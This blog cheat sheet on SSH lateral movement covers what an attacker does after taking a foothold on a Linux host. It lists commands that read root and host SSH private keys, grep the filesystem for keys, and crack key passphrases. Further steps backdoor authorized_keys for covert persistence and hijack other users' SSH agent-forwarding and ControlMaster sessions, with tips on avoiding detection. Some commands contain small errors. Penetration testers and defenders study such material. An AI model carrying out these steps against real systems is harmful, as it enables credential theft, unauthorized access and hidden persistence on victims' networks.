---
layout: blog_item
title: "SSH Lateral Movement Cheat Sheet"
date:   2021-06-03 15:29:10
author: Arr0way
description: 'SSH lateral movement cheat sheet, a collection of lateral movement techniques to move deeper through the network.'
categories: [cheat-sheet]
tags:

- 'Linux Lateral Movement'
---

* list element with functor item
{:toc}

## What is a Lateral Movement 

A lateral movement typically occurs after a host has been compromised via a reverse shell, and foothold in the network is obtained. Fully compromising the target machine by performing Linux privilege escalation or Windows privilege escalation could be adventagious due to the increased access to files or operating system functionality leveraged by a root level account.

This article focuses specifically on SSH lateral movement techniques on Linux.

<!--more-->

## SSH Lateral Movement 

SSH private keys are typically an easy way to progress through the network, and are often found with poor permissions or duplicated in home directories. This article does not cover SSH pivoting in depth, we have a seperate resource for [SSH pivoting](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/).  

<div class="note info">
  <h5>SSH is no longer specific to Linux hosts only</h5>
  <p>SSH is no longer specific to Linux hosts only, consider enumerating Windows target for private keys.</p>
</div>

### Manually Look for SSH Keys

Check home directories and obvious locations for private key files: 

{% highlight bash %}

/home/*
cat /root/.ssh/authorized\_keys 
cat /root/.ssh/identity.pub 
cat /root/.ssh/identity 
cat /root/.ssh/id\_rsa.pub 
cat /root/.ssh/id\_rsa 
cat /root/.ssh/id\_dsa.pub 
cat /root/.ssh/id\_dsa 
cat /etc/ssh/ssh\_config 
cat /etc/ssh/sshd\_config 
cat /etc/ssh/ssh\_host\_dsa\_key.pub 
cat /etc/ssh/ssh\_host\_dsa\_key 
cat /etc/ssh/ssh\_host\_rsa\_key.pub 
cat /etc/ssh/ssh\_host\_rsa\_key 
cat /etc/ssh/ssh\_host\_key.pub 
cat /etc/ssh/ssh\_host\_key
cat ~/.ssh/authorized\_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id\_rsa.pub 
cat ~/.ssh/id\_rsa 
cat ~/.ssh/id\_dsa.pub 
cat ~/.ssh/id\_dsa 

{% endhighlight %}

### Search For Files Containing SSH Keys

{% highlight bash %} 
grep -irv "-----BEGIN RSA PRIVATE KEY-----" /home/*
grep -irv "BEGIN DSA PRIVATE KEY" /home/*

grep -irv "BEGIN RSA PRIVATE KEY" /*
grep -irv "BEGIN DSA PRIVATE KEY" /*

{% endhighlight %}


### Identify The Host for the Key

<div class="note tip">
  <h5>Hashed known_hosts</h5>
  <p>Modern Linux systems may hash the known_hosts file entries to help prevent against enumeration.</p>
</div>

If you find a key you then need to identify what server the key is for. In an attempt to idenitfy what host the key is for the following locations should be checked: 

{% highlight bash %}
/etc/hosts 
~/.known_hosts
~/.bash_history 
~/.ssh/config 
{% endhighlight %}

### Cracking SSH Passphrase Keys

If the discovered SSH key is encrypted with a passphrase this can be cracked locally (much faster), below are several methods. If you have access to a GPU hashcat should be leveraged to improve the cracking time. 

#### Cracking SSH Passphrase with John the Ripper 

John the Ripper has a function to convert he key to a hash called john2hash.py and comes pre installed on Kali.

1. Convert the hash: python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash-john 
2. Use a comprehensive wordlist: john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash-john 
3. Wait and hope 

<div class="note warning">
  <h5>Help Avoid Detection</h5>
  <p>Avoid directly connecting from a unknown host to the target SSH server, use an already known host to help prevent detection alerts being issued. </p>
</div>

### SSH Passphrase Backdoor

While you have access to the compromised host, it is typically a good idea to backdoor the SSH authorized_keys file which will allow for passwordless login at a point in the future. This should provide an easier and more reliable connection than exploiting and accessing via a reverse shell; and potentially reduce the risk of detection. 

Adding the key is simply a case of paste a SSH public key, generated on your attacking machine and pasting it into the ~/ssh/authorized_keys file on the compromised machine. 

1. run ssh-keygen -t rsa -b 4096 
2. cat id_rsa.pub and copy the file contents 
3. echo "SSH key data" >> ~/.ssh/authorized_keys 
4. Test you can connect using the private key without being prompted for a password 

## SSH Agent Forwarding Hijacking

Starting point: You have SSH already backdoored the compromised host by adding your public key to the ~/.authorized_keys file.  

### How SSH Agent Works

SSH agent works by allowing the Intermediary machine to pass-through (forward) your SSH key from your client to the next downstream server, allowing the machine in the middle (potentially a bastian host) to use your key without having physical access to your key as they are not stored on the intermediate host but simply forwarded on to the downstream target server. 

- Access the machine where the existing victim user session is established
- Root level access to the machine where the victim session is established
- A current victim SSH  connection with agent forwarding enabled 

Your Machine => Intermediary Host (forwards your key) => Downsteam Machine 

#### The Risk

The risk here is that if you have an open session and the intermedatory machine 

### How To Hijack SSH Agent Forwarding

Attacking Machine => Compromised Intermediary Host (with SSH Key) => Downsteam Machine (final destination) 

SSH agent forwarding allows a user to connect to other machines without entering passwords. This functionality can be exploited to access any host the compromised users SSH key has access to (without having direct access to the keys), while there is an active session. 

A potentially easier way to think of SSH agent forwarding, is to think of it as assigning the SSH key to the active SSH session, while the session is in place it is possible to access the SSH key and connect to other machines that the SSH key has access.     

In order to exploit SSH agent forwarding an active session must be open between the users client (that you wish to hijack) and the compromised intermediary host. You will also require access to the host where the user connect is with a superuser account with the privilages (such as ```su - username```) to access the account running the active SSH session you wish to hijack. 

<div class="note tip">
  <h5>If -A SSH Connection Fails</h5>
  <p>If -A fails to connect, perform the following: ```echo "ForwardingAgent yes" >> ~/.ssh/config``` to enable agent forwarding. </p>
</div>

#### Client Instructions 

Run the following on your local client machine: 

You may need to create a new key, if so run ```ssh-add```. 

1. Open an SSH connection using agent forwarding to the compromised host  ```ssh -A user@compromsied-host``` 
2. Verify agent forwarding is working by using: ```ssh-add -l```
3. Obtain root: ```sudo -s```
4. Gain access to the account you wish to access:  ``` su - victim ```
5. Access any SSH connection the private key of the victim has access 

### SSH Hijacking with ControlMaster 

OpenSSH has an function called **ControlMaster** that enables the sharing of multiple sessions over a single network connection. Allowing you to connect to the server once and have all other subsequent ssh sessions use the initial connection. 

In order to exploit SSH ControlMaster you first need shell level access to the target, you will then need sufficient privileges to modify the config of a user to enable the  ControlMaster functionality.

1. Gain shell level access to the target machine 
2. Access the victim users home directory and create / modify the file ``` ~/.ssh/config ``` 
3. Add the following configuration: 

{% highlight bash %}
Host *

ControlMaster auto
~/.ssh/master-socket/%r@%h:%p
ControlPersist yes
{% endhighlight %}

4. ensure the master-socket directory exists if it does not, create it  ```mkdir ~/.ssh/master-socket/ ``` 
5. Ensure the correct permissions are in place for the config file  ```chmod 600 ~/.ssh/config ```
6. Wait for the victim to login and establish a connection to another server 
7. View the directory created at step 4 to observe the socket file:  ```ls -lat ~/.ssh/master-socket ```
8. To hijack the existing connection ssh to user@hostname / IP listed in step 7 


If you know of more techniques let me know on twitter @Arr0way 

Enjoy. 
